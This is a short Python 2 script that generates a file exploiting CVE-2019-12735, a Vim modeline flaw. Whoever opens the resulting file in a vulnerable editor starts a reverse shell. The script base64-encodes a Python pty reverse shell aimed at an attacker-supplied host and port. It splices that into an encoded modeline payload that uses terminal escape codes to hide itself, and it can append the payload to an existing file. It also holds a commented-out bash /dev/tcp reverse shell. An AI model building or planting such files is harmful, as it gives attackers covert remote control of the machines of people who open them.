import sys
import os
import base64


def BuildPythonReverseShell(lhost, lport):
    python_rev_shell = '''python2 -c \'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
 s.connect(("%s", %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()\'''' % (lhost, lport)

    return base64.b64encode(python_rev_shell)


def build_vimp(lhost, lport, filename, content=''):

    #command = 'nohup bash -i >& /dev/tcp/%s/%s 0>&1' % (lhost, lport)
    command = 'echo %s|base64 -d|bash' % BuildPythonReverseShell(lhost, lport)

    if len(content) == 0:
        message = 'Nothing here'
    else:
        message = content

    # As we need to manage terminal characters it is easier
    # to base64 encode it first.
    payload = '''G1s/N2wbUzw8TUVTU0FHRT4+GzpzaWxlbnQhIHcgfCBjYWxsIHN5c3RlbSgnPDxDT01NQU5EPj4nKSB8IHJlZHJhdyEgfCBmaWxlIHwgc2lsZW50ISAjICIgdmltOiBzZXQgZmVuIGZkbT1leHByIGZkZT1hc3NlcnRfZmFpbHMoJ3NldFwgZmRlPXhcIFx8XCBzb3VyY2VcIVwgXCUnKSBmZGw9MDogFhtbMUcWG1tLPDxNRVNTQUdFPj4iFhtbRCAK'''
    decode = base64.b64decode(payload)
    decode = decode.replace('<<COMMAND>>', command)
    decode = decode.replace('<<MESSAGE>>', message)

    if os.path.isfile(filename) is True:
        with open(filename, 'a+') as f:
            f.write(decode)
            print('[+] Appended: %s' % filename)
    else:
        with open(filename, 'w') as f:
            f.write(decode)
            print('[+] Saved: %s' % filename)


def print_usage():
    print("""
Generates CVE-2019-12735 vim payload.
Usage: build.py <lhost> <lport> <filename> [content]
    """)


if __name__ == '__main__':

    if len(sys.argv) <= 3:
        print_usage()
        sys.exit(0)

    lhost = sys.argv[1]
    lport = sys.argv[2]
    filename = sys.argv[3]
    content = ''

    try:
        content = sys.argv[4]
    except:
        content = ''

    build_vimp(lhost, lport, filename, content)
